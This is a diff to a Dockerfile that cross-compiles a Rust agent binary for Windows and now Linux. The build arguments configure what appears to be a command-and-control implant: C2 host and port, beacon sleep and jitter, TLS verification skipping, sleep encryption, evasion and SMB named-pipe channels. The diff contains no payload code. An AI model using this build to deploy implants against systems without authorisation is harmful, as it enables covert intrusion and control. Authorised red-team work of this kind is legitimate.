@@ -2,10 +2,16 @@ FROM rust:1.86-alpine AS builder
 
 RUN apk add --no-cache mingw-w64-gcc musl-dev
 
-RUN rustup target add x86_64-pc-windows-gnu
+RUN rustup target add x86_64-pc-windows-gnu x86_64-unknown-linux-musl
 
 WORKDIR /build
 COPY agent/ .
+
+# Target selects the Rust cross-compile triple and output binary name.
+# Windows:  DM_TARGET=x86_64-pc-windows-gnu   DM_BIN=dm-agent.exe
+# Linux x64: DM_TARGET=x86_64-unknown-linux-musl DM_BIN=dm-agent
+ARG DM_TARGET=x86_64-pc-windows-gnu
+ARG DM_BIN=dm-agent.exe
 
 ARG DM_C2_HOST=127.0.0.1
 ARG DM_C2_PORT=4443
@@ -17,8 +23,14 @@ ARG DM_SLEEP_SECS=30
 ARG DM_JITTER_PCT=20
 ARG DM_TLS_SKIP_VERIFY=false
 ARG DM_NO_EVASION=false
+ARG DM_UA=
+ARG DM_SLEEP_ENCRYPT=false
+ARG DM_SMB_HOST=
+ARG DM_SMB_PIPE=
 
-ENV DM_C2_HOST=$DM_C2_HOST \
+ENV DM_TARGET=$DM_TARGET \
+    DM_BIN=$DM_BIN \
+    DM_C2_HOST=$DM_C2_HOST \
     DM_C2_PORT=$DM_C2_PORT \
     DM_C2_PATH_POLL=$DM_C2_PATH_POLL \
     DM_C2_PATH_REG=$DM_C2_PATH_REG \
@@ -27,9 +39,15 @@ ENV DM_C2_HOST=$DM_C2_HOST \
     DM_SLEEP_SECS=$DM_SLEEP_SECS \
     DM_JITTER_PCT=$DM_JITTER_PCT \
     DM_TLS_SKIP_VERIFY=$DM_TLS_SKIP_VERIFY \
-    DM_NO_EVASION=$DM_NO_EVASION
+    DM_NO_EVASION=$DM_NO_EVASION \
+    DM_UA=$DM_UA \
+    DM_SLEEP_ENCRYPT=$DM_SLEEP_ENCRYPT \
+    DM_SMB_HOST=$DM_SMB_HOST \
+    DM_SMB_PIPE=$DM_SMB_PIPE
 
-RUN cargo build --release --target x86_64-pc-windows-gnu
+RUN cargo build --release --target $DM_TARGET
 
 FROM alpine:3.20
-COPY --from=builder /build/target/x86_64-pc-windows-gnu/release/dm-agent.exe /dm-agent.exe
+ARG DM_TARGET=x86_64-pc-windows-gnu
+ARG DM_BIN=dm-agent.exe
+COPY --from=builder /build/target/${DM_TARGET}/release/${DM_BIN} /${DM_BIN}
